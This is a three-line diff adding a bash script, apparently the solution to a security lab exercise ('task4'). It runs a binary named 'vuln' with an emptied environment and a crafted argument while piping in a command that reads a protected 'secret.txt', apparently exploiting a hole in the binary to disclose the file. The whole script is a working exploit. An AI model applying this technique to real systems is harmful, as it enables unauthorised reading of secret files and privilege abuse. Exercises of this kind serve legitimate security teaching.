@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+echo /bin/cat /task4/template/secret.txt | env -i SHELL=/bin/sh \
+  /task4/template/vuln "$(python -c "print('No, it doesn\\'t.')")" 0
